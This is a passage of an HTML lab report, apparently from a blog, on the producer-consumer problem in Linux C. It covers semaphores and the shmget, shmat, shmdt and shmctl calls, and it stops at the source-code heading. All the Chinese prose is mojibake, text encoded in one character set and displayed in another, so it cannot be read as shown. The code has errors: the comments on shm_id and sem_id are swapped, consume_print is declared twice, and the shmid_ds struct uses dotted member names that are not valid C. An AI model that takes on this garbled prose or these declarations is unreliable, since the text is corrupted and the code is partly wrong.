äºŒã€å®éªŒç›®çš„</h2><ul><li>ç†Ÿæ‚‰ä¸´ç•Œèµ„æºã€ä¿¡å·é‡åŠPVæ“ä½œçš„å®šä¹‰ä¸ç‰©ç†æ„ä¹‰</li><li>äº†è§£è¿›ç¨‹é€šä¿¡çš„æ–¹æ³•</li><li>æŒæ¡è¿›ç¨‹äº’æ–¥ä¸è¿›ç¨‹åŒæ­¥çš„ç›¸å…³çŸ¥è¯†</li><li>æŒæ¡ç”¨ä¿¡å·é‡æœºåˆ¶è§£å†³è¿›ç¨‹ä¹‹é—´çš„åŒæ­¥ä¸äº’æ–¥é—®é¢˜</li><li>å®ç°ç”Ÿäº§è€…ï¼æ¶ˆè´¹è€…é—®é¢˜ï¼Œæ·±åˆ»ç†è§£è¿›ç¨‹åŒæ­¥é—®é¢˜</li></ul><h2 id="ä¸‰-å®éªŒé¢˜ç›®"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢˜ç›®"></a> ä¸‰ã€å®éªŒé¢˜ç›®</h2><h3 id="è¿›ç¨‹å®ç°"><a class="markdownIt-Anchor" href="#è¿›ç¨‹å®ç°"></a> è¿›ç¨‹å®ç°</h3><p>åœ¨Linuxæ“ä½œç³»ç»Ÿä¸‹ç”¨Cå®ç°ç»å…¸åŒæ­¥é—®é¢˜ï¼šç”Ÿäº§è€…â€”æ¶ˆè´¹è€…ï¼Œå…·ä½“è¦æ±‚å¦‚ä¸‹ï¼š</p><ol><li>ä¸€ä¸ªå¤§å°ä¸º10çš„ç¼“å†²åŒºï¼Œåˆå§‹çŠ¶æ€ä¸ºç©ºã€‚</li><li>2ä¸ªç”Ÿäº§è€…ï¼Œéšæœºç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œå¾€ç¼“å†²åŒºä¸­æ·»åŠ æ•°æ®ï¼Œè‹¥ç¼“å†²åŒºå·²æ»¡ï¼Œç­‰å¾…æ¶ˆè´¹è€…å–èµ°æ•°æ®ä¹‹åå†æ·»åŠ ï¼Œé‡å¤10æ¬¡ã€‚</li><li>2ä¸ªæ¶ˆè´¹è€…ï¼Œéšæœºç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œä»ç¼“å†²åŒºä¸­è¯»å–æ•°æ®ï¼Œè‹¥ç¼“å†²åŒºä¸ºç©ºï¼Œç­‰å¾…ç”Ÿäº§è€…æ·»åŠ æ•°æ®ä¹‹åå†è¯»å–ï¼Œé‡å¤10æ¬¡ã€‚</li></ol><p><strong>æç¤º</strong><br>æœ¬å®éªŒçš„ä¸»è¦ç›®çš„æ˜¯æ¨¡æ‹Ÿæ“ä½œç³»ç»Ÿä¸­è¿›ç¨‹åŒæ­¥å’Œäº’æ–¥ã€‚åœ¨ç³»ç»Ÿè¿›ç¨‹å¹¶å‘æ‰§è¡Œå¼‚æ­¥æ¨è¿›çš„è¿‡ç¨‹ä¸­ï¼Œç”±äºèµ„æºå…±äº«å’Œè¿›ç¨‹é—´åˆä½œè€Œé€ æˆè¿›ç¨‹é—´ç›¸äº’åˆ¶çº¦ã€‚è¿›ç¨‹é—´çš„ç›¸äº’åˆ¶çº¦æœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼ã€‚</p><ol><li>é—´æ¥åˆ¶çº¦ã€‚è¿™æ˜¯ç”±äºå¤šä¸ªè¿›ç¨‹å…±äº«åŒä¸€èµ„æºï¼ˆå¦‚CPUã€å…±äº«è¾“å…¥/è¾“å‡ºè®¾å¤‡ï¼‰è€Œå¼•èµ·çš„ï¼Œå³å…±äº«èµ„æºçš„å¤šä¸ªè¿›ç¨‹å› ç³»ç»Ÿåè°ƒä½¿ç”¨èµ„æºè€Œç›¸äº’åˆ¶çº¦ã€‚</li><li>ç›´æ¥åˆ¶çº¦ã€‚åªæ˜¯ç”±äºè¿›ç¨‹åˆä½œä¸­å„ä¸ªè¿›ç¨‹ä¸ºå®ŒæˆåŒä¸€ä»»åŠ¡è€Œé€ æˆçš„ï¼Œå³å¹¶å‘è¿›ç¨‹å„è‡ªçš„æ‰§è¡Œç»“æœäº’ä¸ºå¯¹æ–¹çš„æ‰§è¡Œæ¡ä»¶ï¼Œä»è€Œé™åˆ¶å„ä¸ªè¿›ç¨‹çš„æ‰§è¡Œé€Ÿåº¦ã€‚</li></ol><p>ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…æ˜¯ç»å…¸çš„è¿›ç¨‹åŒæ­¥é—®é¢˜ï¼Œåœ¨è¿™ä¸ªé—®é¢˜ä¸­ï¼Œç”Ÿäº§è€…ä¸æ–­çš„å‘ç¼“å†²åŒºä¸­å†™å…¥æ•°æ®ï¼Œè€Œæ¶ˆè´¹è€…åˆ™ä»ç¼“å†²åŒºä¸­è¯»å–æ•°æ®ã€‚ç”Ÿäº§è€…è¿›ç¨‹å’Œæ¶ˆè´¹è€…å¯¹ç¼“å†²åŒºçš„æ“ä½œæ˜¯äº’æ–¥ï¼Œå³å½“å‰åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹å¯¹è¿™ä¸ªç¼“å†²åŒºè¿›è¡Œæ“ä½œï¼Œç”Ÿäº§è€…è¿›å…¥æ“ä½œç¼“å†²åŒºä¹‹å‰ï¼Œå…ˆè¦çœ‹ç¼“å†²åŒºæ˜¯å¦å·²æ»¡ï¼Œå¦‚æœç¼“å†²åŒºå·²æ»¡ï¼Œåˆ™å®ƒå¿…é¡»ç­‰å¾…æ¶ˆè´¹è€…è¿›ç¨‹å°†æ•°æ®å–å‡ºæ‰èƒ½å†™å…¥æ•°æ®ï¼ŒåŒæ ·çš„ï¼Œæ¶ˆè´¹è€…è¿›ç¨‹ä»ç¼“å†²åŒºè¯»å–æ•°æ®ä¹‹å‰ï¼Œä¹Ÿè¦åˆ¤æ–­ç¼“å†²åŒºæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™å¿…é¡»ç­‰å¾…ç”Ÿäº§è€…è¿›ç¨‹å†™å…¥æ•°æ®æ‰èƒ½è¯»å–æ•°æ®ã€‚</p><p>åœ¨è¿™ä¸ªé—®é¢˜å½“ä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨ä¿¡å·é‡æœºåˆ¶è¿›è¡Œè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œè®¾ç½®ä¸¤ä¸ªä¿¡å·é‡ï¼Œç©ºçš„ä¿¡å·é‡å’Œæ»¡çš„ä¿¡å·é‡ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªæˆ–å¤šä¸ªä¿¡å·é‡æ„æˆä¸€ä¸ªä¿¡å·é‡é›†åˆã€‚ä½¿ç”¨ä¿¡å·é‡æœºåˆ¶å¯ä»¥å®ç°è¿›ç¨‹ä¹‹é—´çš„åŒæ­¥å’Œäº’æ–¥ï¼Œå…è®¸å¹¶å‘è¿›ç¨‹ä¸€æ¬¡å¯¹ä¸€ç»„ä¿¡å·é‡è¿›è¡Œç›¸åŒæˆ–ä¸åŒçš„æ“ä½œã€‚æ¯ä¸ªPã€Væ“ä½œä¸é™äºå‡1æˆ–åŠ 1ï¼Œè€Œæ˜¯å¯ä»¥åŠ å‡ä»»ä½•æ•´æ•°ã€‚åœ¨è¿›ç¨‹ç»ˆæ­¢æ—¶ï¼Œç³»ç»Ÿå¯æ ¹æ®éœ€è¦è‡ªåŠ¨æ¶ˆé™¤æ‰€æœ‰è¢«è¿›ç¨‹æ“ä½œè¿‡çš„ä¿¡å·é‡çš„å½±å“</p><ol><li><p>ç¼“å†²åŒºé‡‡ç”¨å¾ªç¯é˜Ÿåˆ—è¡¨ç¤ºï¼Œåˆ©ç”¨å¤´ã€å°¾æŒ‡é’ˆæ¥å­˜æ”¾ã€è¯»å–æ•°æ®ï¼Œä»¥åŠåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºã€‚ç¼“å†²åŒºä¸­æ•°ç»„å¤§å°ä¸º10ï¼›</p></li><li><p>åˆ©ç”¨éšæœºå‡½æ•°rand()å¾—åˆ°Aï½Zçš„ä¸€ä¸ªéšæœºå­—ç¬¦ï¼Œä½œä¸ºç”Ÿäº§è€…æ¯æ¬¡ç”Ÿäº§çš„æ•°æ®ï¼Œå­˜æ”¾åˆ°ç¼“å†²åŒºä¸­ï¼›</p></li><li><p>ä½¿ç”¨shmget()ç³»ç»Ÿè°ƒç”¨å®ç°å…±äº«ä¸»å­˜æ®µçš„åˆ›å»ºï¼Œshmget()è¿”å›å…±äº«å†…å­˜åŒºçš„IDã€‚å¯¹äºå·²ç»ç”³è¯·åˆ°çš„å…±äº«æ®µï¼Œè¿›ç¨‹éœ€æŠŠå®ƒé™„åŠ åˆ°è‡ªå·±çš„è™šæ‹Ÿç©ºé—´ä¸­æ‰èƒ½å¯¹å…¶è¿›è¡Œè¯»å†™ã€‚</p></li><li><p>ä¿¡å·é‡çš„å»ºç«‹é‡‡ç”¨semget()å‡½æ•°ï¼ŒåŒæ—¶å»ºç«‹ä¿¡å·é‡çš„æ•°é‡ã€‚åœ¨ä¿¡å·é‡å»ºç«‹åï¼Œè°ƒç”¨semctl()å¯¹ä¿¡å·é‡è¿›è¡Œåˆå§‹åŒ–ï¼Œä¾‹å¦‚æœ¬å®éªŒä¸­ï¼Œå¯ä»¥å»ºç«‹ä¸¤ä¸ªä¿¡å·é‡SEM_EMPTYã€SEM_FULLï¼Œåˆå§‹åŒ–æ—¶è®¾ç½®SEM_EMPTYä¸º10ï¼ŒSEM_FULLä¸º0ã€‚ä½¿ç”¨æ“ä½œä¿¡å·çš„å‡½æ•°semop()åšæ’é™¤å¼æ“ä½œï¼Œä½¿ç”¨è¿™ä¸ªå‡½æ•°é˜²æ­¢å¯¹å…±äº«å†…å­˜çš„åŒæ—¶æ“ä½œã€‚å¯¹å…±äº«å†…å­˜æ“ä½œå®Œæ¯•åé‡‡ç”¨shmctl()å‡½æ•°æ’¤é”€å…±äº«å†…å­˜æ®µã€‚</p></li><li><p>ä½¿ç”¨å¾ªç¯ï¼Œåˆ›å»º2ä¸ªç”Ÿäº§è€…ä»¥åŠ2ä¸ªæ¶ˆè´¹è€…ï¼Œé‡‡ç”¨å‡½æ•°fork()åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚</p></li><li><p>ä¸€ä¸ªè¿›ç¨‹çš„ä¸€æ¬¡æ“ä½œå®Œæˆåï¼Œé‡‡ç”¨å‡½æ•°fflush()åˆ·æ–°ç¼“å†²åŒºã€‚</p></li><li><p>ç¨‹åºæœ€åä½¿ç”¨semctl()å‡½æ•°é‡Šæ”¾å†…å­˜ã€‚</p></li></ol><ul><li>ä¸»ç¨‹åºæµç¨‹å›¾ï¼š</li></ul><p><img src="/posts/3994810f/image-20211130105214487.png" alt="image-20211130105214487"></p><ul><li>ç”Ÿäº§è€…è¿›ç¨‹æµç¨‹å›¾</li></ul><p><img src="/posts/3994810f/image-20211130105238309.png" alt="image-20211130105238309"></p><ul><li>æ¶ˆè´¹è€…è¿›ç¨‹æµç¨‹å›¾</li></ul><p><img src="/posts/3994810f/image-20211130105350695.png" alt="image-20211130105350695"></p><ul><li>Pæ“ä½œæµç¨‹å›¾</li></ul><p><img src="/posts/3994810f/image-20211130105635105.png" alt="image-20211130105635105"></p><ul><li>Væ“ä½œæµç¨‹å›¾</li></ul><p><img src="/posts/3994810f/image-20211130105654202.png" alt="image-20211130105654202"></p><h3 id="æ€è€ƒé¢˜-çº¿ç¨‹å®ç°"><a class="markdownIt-Anchor" href="#æ€è€ƒé¢˜-çº¿ç¨‹å®ç°"></a> æ€è€ƒé¢˜ çº¿ç¨‹å®ç°</h3><p>é‡‡ç”¨çº¿ç¨‹æ¥å®ç°</p><h2 id="å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å››-å®éªŒè®¾è®¡ä¸è¿‡ç¨‹"></a> å››ã€å®éªŒè®¾è®¡ä¸è¿‡ç¨‹</h2><h3 id="è¿›ç¨‹å®ç°-2"><a class="markdownIt-Anchor" href="#è¿›ç¨‹å®ç°-2"></a> è¿›ç¨‹å®ç°</h3><h4 id="é¢„å¤‡çŸ¥è¯†"><a class="markdownIt-Anchor" href="#é¢„å¤‡çŸ¥è¯†"></a> é¢„å¤‡çŸ¥è¯†</h4><p>ä¸ä¿¡å·é‡ä¸€æ ·ï¼Œåœ¨Linuxä¸­ä¹Ÿæä¾›äº†ä¸€ç»„å‡½æ•°æ¥å£ç”¨äºä½¿ç”¨å…±äº«å†…å­˜ï¼Œè€Œä¸”ä½¿ç”¨å…±äº«å…±å­˜çš„æ¥å£è¿˜ä¸ä¿¡å·é‡çš„éå¸¸ç›¸ä¼¼ï¼Œè€Œä¸”æ¯”ä½¿ç”¨ä¿¡å·é‡çš„æ¥å£æ¥å¾—ç®€å•ã€‚å®ƒä»¬å£°æ˜åœ¨å¤´æ–‡ä»¶ sys/shm.h ä¸­ã€‚</p><h5 id="1-shmgetå‡½æ•°"><a class="markdownIt-Anchor" href="#1-shmgetå‡½æ•°"></a> 1ã€shmget()å‡½æ•°</h5><p>è¯¥å‡½æ•°ç”¨æ¥åˆ›å»ºå…±äº«å†…å­˜ï¼Œå®ƒçš„åŸå‹ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmget</span><span class="hljs-params">(<span class="hljs-keyword">key_t</span> key, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">int</span> shmflg)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸ä¿¡å·é‡çš„semgetå‡½æ•°ä¸€æ ·ï¼Œç¨‹åºéœ€è¦æä¾›ä¸€ä¸ªå‚æ•°keyï¼ˆé0æ•´æ•°ï¼‰ï¼Œå®ƒæœ‰æ•ˆåœ°ä¸ºå…±äº«å†…å­˜æ®µå‘½åï¼Œshmget()å‡½æ•°æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªä¸keyç›¸å…³çš„å…±äº«å†…å­˜æ ‡è¯†ç¬¦ï¼ˆéè´Ÿæ•´æ•°ï¼‰ï¼Œç”¨äºåç»­çš„å…±äº«å†…å­˜å‡½æ•°ã€‚è°ƒç”¨å¤±è´¥è¿”å›-1.</p><p>ä¸ç›¸å…³çš„è¿›ç¨‹å¯ä»¥é€šè¿‡è¯¥å‡½æ•°çš„è¿”å›å€¼è®¿é—®åŒä¸€å…±äº«å†…å­˜ï¼Œå®ƒä»£è¡¨ç¨‹åºå¯èƒ½è¦ä½¿ç”¨çš„æŸä¸ªèµ„æºï¼Œç¨‹åºå¯¹æ‰€æœ‰å…±äº«å†…å­˜çš„è®¿é—®éƒ½æ˜¯é—´æ¥çš„ï¼Œç¨‹åºå…ˆé€šè¿‡è°ƒç”¨shmget()å‡½æ•°å¹¶æä¾›ä¸€ä¸ªé”®ï¼Œå†ç”±ç³»ç»Ÿç”Ÿæˆä¸€ä¸ªç›¸åº”çš„å…±äº«å†…å­˜æ ‡è¯†ç¬¦ï¼ˆshmget()å‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼Œåªæœ‰shmget()å‡½æ•°æ‰ç›´æ¥ä½¿ç”¨ä¿¡å·é‡é”®ï¼Œæ‰€æœ‰å…¶ä»–çš„ä¿¡å·é‡å‡½æ•°ä½¿ç”¨ç”±semgetå‡½æ•°è¿”å›çš„ä¿¡å·é‡æ ‡è¯†ç¬¦ã€‚</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œsizeä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šéœ€è¦å…±äº«çš„å†…å­˜å®¹é‡</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œshmflgæ˜¯æƒé™æ ‡å¿—ï¼Œå®ƒçš„ä½œç”¨ä¸openå‡½æ•°çš„modeå‚æ•°ä¸€æ ·ï¼Œå¦‚æœè¦æƒ³åœ¨keyæ ‡è¯†çš„å…±äº«å†…å­˜ä¸å­˜åœ¨æ—¶ï¼Œåˆ›å»ºå®ƒçš„è¯ï¼Œå¯ä»¥ä¸IPC_CREATåšæˆ–æ“ä½œã€‚å…±äº«å†…å­˜çš„æƒé™æ ‡å¿—ä¸æ–‡ä»¶çš„è¯»å†™æƒé™ä¸€æ ·ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œ0644,å®ƒè¡¨ç¤ºå…è®¸ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºçš„å…±äº«å†…å­˜è¢«å†…å­˜åˆ›å»ºè€…æ‰€æ‹¥æœ‰çš„è¿›ç¨‹å‘å…±äº«å†…å­˜è¯»å–å’Œå†™å…¥æ•°æ®ï¼ŒåŒæ—¶å…¶ä»–ç”¨æˆ·åˆ›å»ºçš„è¿›ç¨‹åªèƒ½è¯»å–å…±äº«å†…å­˜ã€‚</p></li></ul><h5 id="2-shmatå‡½æ•°"><a class="markdownIt-Anchor" href="#2-shmatå‡½æ•°"></a> 2ã€shmat()å‡½æ•°</h5><p>â€“ atï¼šattach</p><p>ç¬¬ä¸€æ¬¡åˆ›å»ºå®Œå…±äº«å†…å­˜æ—¶ï¼Œå®ƒè¿˜ä¸èƒ½è¢«ä»»ä½•è¿›ç¨‹è®¿é—®ï¼Œshmat()å‡½æ•°çš„ä½œç”¨å°±æ˜¯ç”¨æ¥å¯åŠ¨å¯¹è¯¥å…±äº«å†…å­˜çš„è®¿é—®ï¼Œå¹¶æŠŠå…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚å®ƒçš„åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">shmat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> shm_id, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *shm_addr, <span class="hljs-keyword">int</span> shmflg)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œshm_idæ˜¯ç”±shmget()å‡½æ•°è¿”å›çš„å…±äº«å†…å­˜æ ‡è¯†ã€‚</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œshm_addræŒ‡å®šå…±äº«å†…å­˜è¿æ¥åˆ°å½“å‰è¿›ç¨‹ä¸­çš„åœ°å€ä½ç½®ï¼Œé€šå¸¸ä¸ºç©ºï¼Œè¡¨ç¤ºè®©ç³»ç»Ÿæ¥é€‰æ‹©å…±äº«å†…å­˜çš„åœ°å€ã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œshm_flgæ˜¯ä¸€ç»„æ ‡å¿—ä½ï¼Œé€šå¸¸ä¸º0ã€‚</p></li></ul><p>è°ƒç”¨æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªæŒ‡å‘å…±äº«å†…å­˜ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æŒ‡é’ˆï¼Œå¦‚æœè°ƒç”¨å¤±è´¥è¿”å›-1.</p><h5 id="3-shmdtå‡½æ•°"><a class="markdownIt-Anchor" href="#3-shmdtå‡½æ•°"></a> 3ã€shmdt()å‡½æ•°</h5><p>â€“ dtï¼šdetach</p><p>è¯¥å‡½æ•°ç”¨äºå°†å…±äº«å†…å­˜ä»å½“å‰è¿›ç¨‹ä¸­åˆ†ç¦»ã€‚æ³¨æ„ï¼Œå°†å…±äº«å†…å­˜åˆ†ç¦»å¹¶ä¸æ˜¯åˆ é™¤å®ƒï¼Œåªæ˜¯ä½¿è¯¥å…±äº«å†…å­˜å¯¹å½“å‰è¿›ç¨‹ä¸å†å¯ç”¨ã€‚å®ƒçš„åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmdt</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *shmaddr)</span></span>;<br></code></pre></div></td></tr></table></figure><p>å‚æ•°shmaddræ˜¯shmat()å‡½æ•°è¿”å›çš„åœ°å€æŒ‡é’ˆï¼Œè°ƒç”¨æˆåŠŸæ—¶è¿”å›0ï¼Œå¤±è´¥æ—¶è¿”å›-1.</p><h5 id="4-shmctlå‡½æ•°"><a class="markdownIt-Anchor" href="#4-shmctlå‡½æ•°"></a> 4ã€shmctl()å‡½æ•°</h5><p>â€“ ctlï¼šcontrol</p><p>ä¸ä¿¡å·é‡çš„semctl()å‡½æ•°ä¸€æ ·ï¼Œç”¨æ¥æ§åˆ¶å…±äº«å†…å­˜ï¼Œå®ƒçš„åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> shm_id, <span class="hljs-keyword">int</span> command, struct shmid_ds *buf)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œshm_idæ˜¯shmget()å‡½æ•°è¿”å›çš„å…±äº«å†…å­˜æ ‡è¯†ç¬¦ã€‚</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œcommandæ˜¯è¦é‡‡å–çš„æ“ä½œï¼Œå®ƒå¯ä»¥å–ä¸‹é¢çš„ä¸‰ä¸ªå€¼ ï¼š</p><ul><li>IPC_STATï¼šæŠŠshmid_dsç»“æ„ä¸­çš„æ•°æ®è®¾ç½®ä¸ºå…±äº«å†…å­˜çš„å½“å‰å…³è”å€¼ï¼Œå³ç”¨å…±äº«å†…å­˜çš„å½“å‰å…³è”å€¼è¦†ç›–shmid_dsçš„å€¼ã€‚</li><li>IPC_SETï¼šå¦‚æœè¿›ç¨‹æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œå°±æŠŠå…±äº«å†…å­˜çš„å½“å‰å…³è”å€¼è®¾ç½®ä¸ºshmid_dsç»“æ„ä¸­ç»™å‡ºçš„å€¼</li><li>IPC_RMIDï¼šåˆ é™¤å…±äº«å†…å­˜æ®µ</li></ul></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œbufæ˜¯ä¸€ä¸ªç»“æ„æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘å…±äº«å†…å­˜æ¨¡å¼å’Œè®¿é—®æƒé™çš„ç»“æ„ã€‚</p><p>shmid_dsç»“æ„ è‡³å°‘åŒ…æ‹¬ä»¥ä¸‹æˆå‘˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">uid_t</span> shm_perm.uid;<br>    <span class="hljs-keyword">uid_t</span> shm_perm.gid;<br>    <span class="hljs-keyword">mode_t</span> shm_perm.mode;<br>&#125;;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"><a class="markdownIt-Anchor" href="#æ•°æ®ç»“æ„å’Œç¬¦å·è¯´æ˜"></a> <strong>æ•°æ®ç»“æ„</strong>å’Œç¬¦å·è¯´æ˜</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//ä¿¡å·é›†åˆå†…çš„æ¯ä¸ªä¿¡å·é‡çš„ç´¢å¼•,</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_FULL 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_EMPTY 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MUTEX 2</span><br><span class="hljs-comment">//ç¼“å†²åŒºç»“æ„</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> out;<br><span class="hljs-keyword">int</span> in;<br><span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br><span class="hljs-keyword">int</span> num; <span class="hljs-comment">//ç¼“å†²åŒºé‡Œå­—æ¯æ•°é‡</span><br><span class="hljs-keyword">int</span> is_empty;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_CONSUMER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//æ¶ˆè´¹è€…æ•°é‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_PRODUCER = <span class="hljs-number">2</span>;  <span class="hljs-comment">//ç”Ÿäº§è€…æ•°é‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_BUFFER = <span class="hljs-number">10</span>;   <span class="hljs-comment">//ç¼“å†²åŒºå®¹é‡</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//å·¥ä½œæ¬¡æ•°</span><br><br><span class="hljs-keyword">int</span> shm_id = <span class="hljs-number">-1</span>;<span class="hljs-comment">//ä¿¡å·é‡id</span><br><br><span class="hljs-keyword">int</span> sem_id = <span class="hljs-number">-1</span>;<span class="hljs-comment">//å…±äº«å†…å­˜id</span><br><span class="hljs-comment">//å­è¿›ç¨‹çš„id</span><br><span class="hljs-keyword">pid_t</span> consumer_id;<br><span class="hljs-keyword">pid_t</span> producer_id;<br><span class="hljs-comment">//å¾—åˆ°10ä»¥å†…çš„ä¸€ä¸ªéšæœºæ•°</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">//sem_id è¡¨ç¤ºä¿¡å·é‡é›†åˆçš„ id</span></span><br><span class="hljs-function"><span class="hljs-comment">//sem_num è¡¨ç¤ºè¦å¤„ç†çš„ä¿¡å·é‡åœ¨ä¿¡å·é‡é›†åˆä¸­çš„ç´¢å¼•</span></span><br><span class="hljs-function"><span class="hljs-comment">//Pæ“ä½œ</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"><span class="hljs-comment">//Væ“ä½œ</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">signalSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"><span class="hljs-comment">//æ‰“å°è¿›ç¨‹è¿è¡Œæ—¶é—´</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">//æ¶ˆè´¹è€…è¿›ç¨‹çš„æ¶ˆè´¹å’Œä¿¡æ¯æ‰“å°</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"><span class="hljs-comment">//æ¶ˆè´¹è€…è¿›ç¨‹çš„æ¶ˆè´¹å’Œä¿¡æ¯æ‰“å°</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br></code></pre></div></td></tr></table></figure><h4 id="æºä»£ç "><a class="markdownIt-Anchor" href="#æºä»£ç "></a> æºä»£ç 